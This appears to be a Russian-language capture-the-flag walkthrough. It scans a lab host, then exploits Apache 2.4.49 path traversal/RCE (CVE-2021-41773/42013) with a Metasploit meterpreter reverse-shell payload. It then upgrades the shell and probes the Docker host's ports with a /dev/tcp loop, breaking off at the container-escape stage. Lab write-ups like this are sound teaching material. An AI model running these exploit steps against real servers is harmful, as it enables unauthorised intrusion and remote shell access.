### ДЛЯ РЕШЕНИЯ НЕОБХОДИМО


### ВЗЯТИЕ ШЕЛЛА
по классике, в первую очередь сканируем порты. на удивление, скан довольно щедрый
```
rustscan --ulimit 5000 --range 0-65535 -a 10.113.166.51 -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
Open 10.113.166.51:22
Open 10.113.166.51:80
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: ...
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.49 ((Unix))
|_http-favicon: Unknown favicon MD5: 02FD5D10B62C7BC5AD03F8B0F105323C // скрипт http-favicon скачивает иконку с сервера и вычисляет ее хэш-сумму в формате MD5. Nmap сравнивает этот хэш со своей встроенной бд. в базе хранятся MD5-хэши стандартных иконок известных систем: WordPress, Joomla, phpMyAdmin, роутеров Cisco, серверов Tomcat и т.д., обычно хеш используется для осинта и для поиска сайтов с тем же шаблоном (через shodan, например), для определения cms. то что нмап ничего не нашел говорит о том, что это не стандартная cms
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE  // TRACE!!! потенциальная xst (хотя в современных браузераз редко возможна, плюс вряд ли встретится в этой машине), но этот метод может выдать внутренние подзаголовки, который добавляет внутренний балансировщик
|_  Potentially risky methods: TRACE
|_http-title: Consult - Business Consultancy Agency Template | Home
|_http-server-header: Apache/2.4.49 (Unix) // SOS!!! у этой версии апаче критическая уязвимость Path Traversal / RCE (CVE-2021-41773)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

попробуем воспользоваться уязвимостью апаче (для удобства воспольуюсь msfconsole). ищем нужный пэйлоад и настраиваем его
```
msf > search apache 2.4.49

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
   1    \_ target: Automatic (Dropper)              .                .          .      .
   2    \_ target: Unix Command (In-Memory)         .                .          .      .
   ...
msf > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
... // (устанавливаем нужное через set)
msf exploit(multi/http/apache_normalize_path_rce) > options
Module options (exploit/multi/http/apache_normalize_path_rce):

   Name       Current Setting       Required  Description
   ----       ---------------       --------  -----------
   CVE        CVE-2021-42013        yes       The vulnerability to use (Accepted: CVE-2021-41773, CVE-2
                                              021-42013)
   DEPTH      5                     yes       Depth for Path Traversal
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][.
                                              ..]. Supported proxies: socks5, socks5h, sapni, http, soc
                                              ks4
   RHOSTS     ip                    yes       The target host(s), see https://docs.metasploit.com/docs/
                                              using-metasploit/basics/using-metasploit.html
   RPORT      80                    yes       The target port (TCP)
   SSL        false                 no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /cgi-bin              yes       Base path
   VHOST      ip                    no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  your_ip          yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```
и ловим реверсшелл за daemon

### ВЫХОД ИЗ ДОКЕРА
по базе сначала апгрейдим шелл и оглядываемся вокруг (```python3 -c 'import pty; pty.spawn("/bin/bash")'```). по названию машины можно сразу предположить, что мы в контейнере 
```
daemon@4a70924bafa0:/bin$ df -h и видела:
overlay 19G 5.9G 12G 34% /   (это специфическая файловая система, которую Docker использует для объединения слоев образа (того самого «пирога», о котором я говорил раньш). Видишь корень (/) на overlay — ты в контейнере.)
```'
```for port in 22 80 443 5985 5986 8080; do ( (echo < /dev/tcp/172.17.0.1/$port) &>/dev/null && echo "Порт $port ОТКРЫТ" ) & done; wait```
